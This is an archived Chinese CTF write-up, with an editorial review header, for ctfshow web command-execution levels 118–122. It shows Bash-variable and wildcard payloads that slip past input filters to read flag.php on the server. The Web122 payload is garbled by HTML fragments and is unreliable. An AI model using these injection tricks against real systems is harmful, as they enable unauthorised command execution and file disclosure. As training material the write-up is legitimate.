---
source: "gelusus/wxvl 公众号漏洞文库"
identifier_role: "unknown"
primary_identifiers: ""
referenced_identifiers: ""
identifier_status: "unknown"
title: "ctfshow web入门命令执行"
product: "ctfshow Bash过滤靶场"
record_type: "analysis"
document_type: "CTF题解Web118–122"
review_status: "text-reviewed"
verification_status: "not-reproduced"
content_status: "needs-review"
prerequisites: "必须Bash而非任意sh，PATH/PWD/HOME/USER/HOSTNAME/SHLVL取值与通配匹配依环境"
side_effects: "原文技术操作的实际副作用未复现核验；按其请求/代码评估状态变更、凭据暴露和业务影响"
archive_url: "https://github.com/Ares-X/VulWiki/blob/41940cb0038d09ca5aaddbe5bffb923e423d210f/Web%E5%AE%89%E5%85%A8/%E5%85%B6%E4%BB%96%E8%BD%AF%E4%BB%B6/%E6%9D%82%E9%A1%B9/ctfshow%20web%E5%85%A5%E9%97%A8%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C.md"
archive_commit: "41940cb0038d09ca5aaddbe5bffb923e423d210f"
source_status: "missing"
source_note: "原始出处待补；仓库归档不等同原始披露"
id: "vw-103c7c101769f590fe302185"
entity_id: "ve-103c7c101769f590fe302185"
schema_version: "1"
---

# ctfshow web入门命令执行

<!-- vulwiki-editorial-rebuild:system-misc -->
## 条目范围与校订

- 本文对象：ctfshow Bash过滤靶场
- 文献类型：CTF题解Web118–122
- 版本、权限及部署边界：必须Bash而非任意sh，PATH/PWD/HOME/USER/HOSTNAME/SHLVL取值与通配匹配依环境
- 核验状态：仅重建文本校订；未执行文中代码、PoC 或扫描，未把截图或转载声明记为本站复现

### 具体结论与待核项

以下为原归档的逐项勘误与证据缺口；可由文本确定的问题已在下文订正，仍缺来源的事实保持待核。

1. 标题泛命令执行而仅指定5关，需关卡索引；源代码/过滤规则仅截图未视检
2. Web122 <A等被HTML标签解析残片污染、span闭合乱入，当前payload不可直接使用，需回源恢复代码围栏
3. ~C/~A位运算和变量未定义时的算术解释、${#}等含义未阐明；固定环境截字不通用
4. RANDOM多次尝试的概率与Shell版本未说明；不把题解当Bash漏洞

### 操作风险

原文技术操作的实际副作用未复现核验；按其请求/代码评估状态变更、凭据暴露和业务影响

技术请求、代码与实验方法按原文保留；其中的破坏性动作仅限授权、可恢复的隔离环境。缺失代码、参数或版本事实不猜补。

### 来源追溯

- 原始披露 URL 未确认；既有归档来源标签保留，不能替代原始公告

### 归档技术正文

zoe
                    zoe  哦0吼   2026-02-12 23:06  
  
Web118  
  
一个输入框，没有其他提示，查看源代码，发现  
  
尝试输入ls等都被过滤了 ，看其他师傅操作，使用了bash内置变量  
  
![](../../.resource/remote/162122042c4bbaaa4e2158874d565ab209d9b16b46174b6c3b7ae8ac3f2693a0.png "")  
  
  
code=${PATH:~C}${PWD:~C} ????.??? 查看源代码得到flag  
  
   
  
  
  
Web119  
  
PATH被过滤了，构造不了nl flag.php，就试试构造其他的。  
  
${HOME:${#HOSTNAME}:${#SHLVL}}  
       
====>  
     
t  
  
   
  
${PWD:${Z}:${#SHLVL}}  
      
====>  
     
/  
  
   
  
/bin/cat flag.php  
  
   
  
${PWD:${#}:${#SHLVL}}???${PWD:${#}:${#SHLVL}}??${HOME:${#HOSTNAME}:${#SHLVL}} ????.???  
  
![](../../.resource/remote/69530b81b218ff0abfe608236f75a832a302cb6d02c4d51dead56c2c0446784f.png "")  
  
Web120  
  
有长度限制，  
  
![](../../.resource/remote/a7f6fd412177c357ac0b5f7e1b7751864a06633b88349a829936b86e05c40108.png "")  
  
code=${PWD::${#SHLVL}}???${PWD::${#SHLVL}}?${USER:~A}? ????.???查看源代码得到flag  
  
![](../../.resource/remote/311eb979a4fb61f46be8ef375e794f190fb2cc4a5b7acc0e3b45e6d975466f36.png "")  
  
Web121  
  
摇骰子，随机到4位数多发几次就行  
  
/bin/base64 flag.php → /???/?????4 ????.??? → ${PWD::${##}}???${PWD::${##}}?????${#RANDOM} ????.???   
  
![](../../.resource/remote/6daa96bfcae02a9f37abe21c607863449ff9666c3e34880ee10eca4a32892d57.png "")  
  
Web122  
  
code=     <A;${HOME::$?}???${HOME::$?}?????${RANDOM::$?} ????.???< span>      </A;${HOME::$?}???${HOME::$?}?????${RANDOM::$?}>  
  
构造错误命令，使$?的结果为1，代替${##}来分割  
  
用命令     <A然后下一条命令中的$?就等价于1了，< span>      </A然后下一条命令中的$?就等价于1了，<>  
  
构造/bin/base64 flag.php => /???/????6? ????.??? =>      <A;${HOME::$?}???${HOME::$?}????${RANDOM::$?}? ????.??? < span>      </A;${HOME::$?}???${HOME::$?}????${RANDOM::$?}?>  
  
要多试几次  
  
![](../../.resource/remote/e7c1772ee71f04074fedbec9006074619edb44d4f043f7610a4adedd64342387.png "")  
  


---

> 来源：gelusus/wxvl（微信公众号漏洞文章自动归档，原始披露 URL 尚未确认，现有链接按来源追溯区分别标注）
